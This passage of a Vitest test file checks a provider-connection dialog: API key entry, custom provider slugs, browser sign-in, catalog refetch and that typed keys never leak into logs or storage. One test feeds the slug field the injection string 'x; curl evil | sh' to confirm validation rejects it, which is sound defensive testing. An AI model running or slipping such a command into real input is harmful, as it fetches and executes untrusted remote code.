    await waitFor(() => expect(screen.getByRole('alert').textContent).toContain('invalid'));
    expect(connectSpy).toHaveBeenCalledWith({ provider: 'openrouter', api_key: 'invalid-x' });
    expect(screen.getByRole('dialog')).toBeTruthy();
    expect(useWorkspaceStore.getState().providerDialog.open).toBe(true);
    expect(keyInput().value).toBe('invalid-x');
    expect(configureSpy).not.toHaveBeenCalled();
  });

  it('double click on connect makes one ipc call', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    selectProvider('OpenRouter');
    typeKey('sk-test-key');
    const connectSpy = vi.spyOn(ipc, 'piConnectProvider').mockImplementation(
      () => new Promise<PiConnectResult>(() => {})
    );

    const button = screen.getByRole('button', { name: 'Connect' });
    fireEvent.click(button);
    fireEvent.click(button);

    expect(connectSpy).toHaveBeenCalledTimes(1);
  });

  it('clears the key on success and on a provider switch', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    selectProvider('OpenRouter');
    typeKey('sk-test-key');
    const button = screen.getByRole('button', { name: 'Connect' });
    await act(async () => {
      fireEvent.click(button);
    });
    await waitFor(() =>
      expect(screen.getByRole('heading', { name: /Connected with API key/ })).toBeTruthy()
    );

    fireEvent.click(screen.getByRole('button', { name: 'Replace key' }));
    expect((screen.getByLabelText('API key') as HTMLInputElement).value).toBe('');

    // Switching to a different provider clears the typed key, and coming back does not restore it.
    typeKey('sk-test-next');
    selectProvider('OpenCode Go');
    expect((screen.getByLabelText('API key') as HTMLInputElement).value).toBe('');
    selectProvider('OpenRouter');
    fireEvent.click(screen.getByRole('button', { name: 'Replace key' }));
    expect((screen.getByLabelText('API key') as HTMLInputElement).value).toBe('');
  });
});

describe('custom slug', () => {
  it('a slug equal to a curated id selects the curated row', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    fireEvent.click(rowOption('Other provider (slug)…'));
    const slugField = screen.getByLabelText('Provider slug') as HTMLInputElement;
    fireEvent.change(slugField, { target: { value: 'openrouter' } });

    expect(rowOption('OpenRouter').getAttribute('aria-selected')).toBe('true');
    expect(screen.getByRole('heading', { name: 'OpenRouter' })).toBeTruthy();
  });

  it('an invalid slug shows the message and disables Connect', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    fireEvent.click(rowOption('Other provider (slug)…'));
    const slugField = screen.getByLabelText('Provider slug') as HTMLInputElement;
    fireEvent.change(slugField, { target: { value: 'Bad Slug' } });
    typeKey('sk-test-key');

    expect(screen.getByText('Use lowercase letters, digits and dashes.')).toBeTruthy();
    expect((screen.getByRole('button', { name: 'Connect' }) as HTMLButtonElement).disabled).toBe(
      true
    );
  });

  it('an invalid or empty custom slug cannot start a sign-in', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();
    const checkSpy = vi.spyOn(ipc, 'piCheckProvider');

    fireEvent.click(rowOption('Other provider (slug)…'));
    fireEvent.click(screen.getByRole('button', { name: 'Sign in with browser instead' }));

    // Empty slug: the slug field stays visible in the sign-in state and Sign in is disabled.
    const slugField = screen.getByLabelText('Provider slug') as HTMLInputElement;
    const signIn = screen.getByRole('button', { name: 'Sign in' }) as HTMLButtonElement;
    expect(signIn.disabled).toBe(true);

    fireEvent.change(slugField, { target: { value: 'x; curl evil | sh' } });
    expect(screen.getByText('Use lowercase letters, digits and dashes.')).toBeTruthy();
    expect((screen.getByRole('button', { name: 'Sign in' }) as HTMLButtonElement).disabled).toBe(true);
    fireEvent.click(screen.getByRole('button', { name: 'Sign in' }));

    const st = useWorkspaceStore.getState();
    expect(st.pendingTerminalCommand).toBeNull();
    expect(st.providerSignIn).toBeNull();
    expect(st.providerDialog.hiddenForSignIn).toBe(false);
    expect(checkSpy).not.toHaveBeenCalled();

    fireEvent.change(slugField, { target: { value: 'my-proxy' } });
    expect((screen.getByRole('button', { name: 'Sign in' }) as HTMLButtonElement).disabled).toBe(false);
  });

  it('connecting a custom slug shows S-CONNECTED and selects the new row (§4.3 step 3)', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    fireEvent.click(rowOption('Other provider (slug)…'));
    const slugField = screen.getByLabelText('Provider slug') as HTMLInputElement;
    fireEvent.change(slugField, { target: { value: 'my-proxy' } });
    typeKey('sk-test-key');

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Connect' }));
    });

    await waitFor(() =>
      expect(screen.getByRole('heading', { name: /Connected with API key/ })).toBeTruthy()
    );
    expect(screen.queryByLabelText('Provider slug')).toBeNull();
    expect(rowOption('my-proxy').getAttribute('aria-selected')).toBe('true');
    const done = screen.getByRole('button', { name: 'Done' });
    expect(done.className.includes('btn-primary-xs')).toBe(true);
  });

  it('resolves a custom preselect once the refreshed status knows the slug', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog('my-proxy');
    renderDialog();
    await flushFocus();

    // Sign-in reopens the dialog with the slug before `refreshPiSetupStatus` has finished, so on
    // mount the row is still the custom "Other" one.
    expect(screen.getByLabelText('Provider slug')).toBeTruthy();

    const status = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
    const template = status.providers[0];
    act(() => {
      overrideStatus({
        providers: [
          ...status.providers,
          {
            ...template,
            id: 'my-proxy',
            label: 'my-proxy',
            configured: true,
            auth_type: 'api_key',
            suggested_models: [],
          },
        ],
        configured_providers: ['my-proxy'],
      });
    });

    await waitFor(() =>
      expect(screen.getByRole('heading', { name: /Connected with API key/ })).toBeTruthy()
    );
    expect(screen.queryByLabelText('Provider slug')).toBeNull();
    expect(rowOption('my-proxy').getAttribute('aria-selected')).toBe('true');
  });

  it('Enter in the search field with no highlighted option keeps the typed slug', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog('my-proxy');
    renderDialog();
    await flushFocus();

    const search = screen.getByRole('combobox');
    search.focus();
    fireEvent.keyDown(search, { key: 'Enter' });

    expect((screen.getByLabelText('Provider slug') as HTMLInputElement).value).toBe('my-proxy');
  });
});

describe('first run and pi missing', () => {
  it('offers Use offline for now on the first run and closes on click', async () => {
    await seedStatus([], { firstRun: true });
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');
    fireEvent.click(screen.getByRole('button', { name: 'Use offline for now' }));

    await waitFor(() => expect(useWorkspaceStore.getState().providerDialog.open).toBe(false));
    expect(configureSpy).toHaveBeenCalledWith({ provider: 'offline', mark_completed: true });
  });

  it('does not offer Use offline for now once the first run is completed', async () => {
    await seedStatus(['opencode-go']);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    expect(screen.queryByRole('button', { name: 'Use offline for now' })).toBeNull();
  });

  it('shows the pi-missing banner and disables Sign in with the banner as description', async () => {
    await seedStatus([]);
    overrideStatus({ pi_available: false, pi_bin: null });
    await seedCatalog();
    openDialog('openai-codex');
    renderDialog();
    await flushFocus();

    const banner = screen.getByText(/pi CLI wasn't found/);
    expect(banner.id).toBeTruthy();
    const signIn = screen.getByRole('button', { name: 'Sign in' }) as HTMLButtonElement;
    expect(signIn.disabled).toBe(true);
    expect(signIn.getAttribute('aria-describedby')).toBe(banner.id);
  });

  it('shows savedUnchecked when pi is missing and the key was saved', async () => {
    await seedStatus([]);
    overrideStatus({ pi_available: false, pi_bin: null });
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    selectProvider('OpenRouter');
    typeKey('sk-test-unchecked');
    const status = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
    vi.spyOn(ipc, 'piConnectProvider').mockResolvedValue({
      status,
      check: null,
      check_error: null,
    });

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Connect' }));
    });

    await waitFor(() =>
      expect(screen.getByRole('status').textContent).toContain("pi wasn't found")
    );
  });
});

describe('model catalog refetch (§4.7)', () => {
  it('Replace key success refetches the catalog once', async () => {
    await seedStatus(['opencode-go']);
    await seedCatalog();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    fireEvent.click(screen.getByRole('button', { name: 'Replace key' }));
    typeKey('sk-test-replaced');
    const listSpy = vi.spyOn(ipc, 'piListModels');

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Save key' }));
    });

    await waitFor(() => expect(listSpy).toHaveBeenCalledTimes(1));
  });

  it('Sign in again waits for a manual check and refetches the catalog only when it is ready (I3)', async () => {
    vi.useFakeTimers();
    await seedStatus(['opencode-go']);
    const base = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
    overrideStatus({
      providers: base.providers.map((entry) =>
        entry.id === 'opencode-go' ? { ...entry, auth_type: 'oauth' } : entry
      ),
    });
    await seedCatalog();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    const checkSpy = vi.spyOn(ipc, 'piCheckProvider');
    checkSpy.mockResolvedValueOnce({
      status: 'not_ready',
      provider: 'opencode-go',
      auth_type: null,
      reason: null,
    });
    checkSpy.mockResolvedValueOnce({
      status: 'ready',
      provider: 'opencode-go',
      auth_type: 'oauth',
      reason: null,
    });
    const listSpy = vi.spyOn(ipc, 'piListModels');

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Sign in again' }));
    });
    // The click must not refetch: the old login's catalog is all pi can report right now.
    expect(listSpy).not.toHaveBeenCalled();
    expect(useWorkspaceStore.getState().providerDialog.hiddenForSignIn).toBe(true);

    // A re-sign-in has no auto-poll: the old credential cannot flip it to Connected by itself.
    await act(async () => {
      await vi.advanceTimersByTimeAsync(130_000);
    });
    expect(checkSpy).not.toHaveBeenCalled();

    act(() => {
      useWorkspaceStore.getState().revealProviderDialog();
    });
    await flushFocus();

    // First manual check is still not ready, so the panel stays in S-WAITING.
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: "I've signed in — check now" }));
    });
    await act(async () => {
      await vi.advanceTimersByTimeAsync(0);
    });
    expect(checkSpy).toHaveBeenCalledTimes(1);
    expect(listSpy).not.toHaveBeenCalled();
    expect(screen.getByRole('button', { name: "I've signed in — check now" })).toBeTruthy();

    // The second manual check sees the new login: refetch exactly once and show Connected.
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: "I've signed in — check now" }));
    });
    await act(async () => {
      await vi.advanceTimersByTimeAsync(0);
    });
    await flushFocus();
    expect(checkSpy).toHaveBeenCalledTimes(2);
    expect(listSpy).toHaveBeenCalledTimes(1);
  });
});

describe('S3-7 — no secret leaks into console, store or storage', () => {
  it('logs nothing that contains the typed key', async () => {
    const spies = (['log', 'info', 'warn', 'error', 'debug'] as const).map((method) =>
      vi.spyOn(console, method).mockImplementation(() => {})
    );

    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    selectProvider('OpenRouter');
    typeKey('sk-test-secret');
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Connect' }));
    });
    await waitFor(() =>
      expect(screen.getByRole('heading', { name: /Connected with API key/ })).toBeTruthy()
    );

    for (const spy of spies) {
      for (const call of spy.mock.calls) {
        expect(JSON.stringify(call)).not.toContain('sk-test-secret');
      }
    }
    expect(JSON.stringify(useWorkspaceStore.getState())).not.toContain('sk-test-secret');
    expect(JSON.stringify(storage.snapshot())).not.toContain('sk-test-secret');
  });
});

describe('AC24 — keyboard operation', () => {
  it('ArrowDown + Enter from the search field selects a row and focuses the panel field', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    const search = screen.getByRole('combobox');
    search.focus();
    fireEvent.keyDown(search, { key: 'ArrowDown' });
    fireEvent.keyDown(search, { key: 'Enter' });

    expect(rowOption('OpenRouter').getAttribute('aria-selected')).toBe('true');
    expect(document.activeElement).toBe(keyInput());
  });

  it('Enter with no highlighted option does not re-activate a row hidden by the search', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    selectProvider('OpenRouter');
    typeKey('sk-test-typed');

    const search = screen.getByRole('combobox');
    fireEvent.change(search, { target: { value: 'zzzzz' } });
    search.focus();
    fireEvent.keyDown(search, { key: 'Enter' });

    expect(keyInput().value).toBe('sk-test-typed');
  });

  it('closes the model picker first and the dialog only on the second Esc', async () => {
    await seedStatus(['opencode-go']);
    await seedCatalog();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    fireEvent.click(screen.getByRole('button', { name: /Default model/i }));
    const comboboxes = screen.getAllByRole('combobox');
    expect(comboboxes.length).toBe(2);

    fireEvent.keyDown(comboboxes[1], { key: 'Escape' });
    expect(screen.getByRole('dialog')).toBeTruthy();
    expect(screen.getAllByRole('combobox').length).toBe(1);

    fireEvent.keyDown(screen.getByRole('dialog'), { key: 'Escape' });
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(useWorkspaceStore.getState().providerDialog.open).toBe(false);
  });
});

describe('ported from PiSetupWizard (model picker)', () => {
  it('lists catalog models of connected providers and Connect ▸ for the others', async () => {
    await seedStatus(['opencode-go']);
    await seedCatalog();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    fireEvent.click(screen.getByRole('button', { name: /Default model/i }));
    const options = screen.getAllByRole('option').map((option) => option.textContent ?? '');

    expect(options.some((text) => text.includes('hy4-flash-free'))).toBe(true);
    expect(options.some((text) => text.includes('OpenRouter') && text.includes('Connect ▸'))).toBe(
      true
    );
  });

  it('"Connect ▸ X" selects X in the provider list and focuses its key field', async () => {
    await seedStatus(['opencode-go']);
    await seedCatalog();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    fireEvent.click(screen.getByRole('button', { name: /Default model/i }));
    const connectOption = screen
      .getAllByRole('option')
      .find((option) => /OpenRouter.*Connect ▸/.test(option.textContent ?? ''));
    expect(connectOption).toBeTruthy();
    fireEvent.click(connectOption as HTMLElement);

    expect(rowOption('OpenRouter').getAttribute('aria-selected')).toBe('true');
    expect(document.activeElement).toBe(keyInput());
  });
});
